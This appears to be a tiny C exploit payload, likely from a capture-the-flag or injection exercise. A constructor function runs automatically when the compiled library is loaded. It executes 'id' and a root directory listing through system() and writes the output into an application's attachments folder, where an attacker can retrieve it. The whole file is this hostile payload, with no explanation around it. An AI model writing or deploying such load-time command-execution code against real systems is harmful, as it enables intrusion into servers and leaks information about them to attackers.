#include <stdlib.h>

__attribute__((constructor))
static void run(void) {
    system("(id; ls -la /) > /app/storage/attachments/result.txt 2>&1");
}
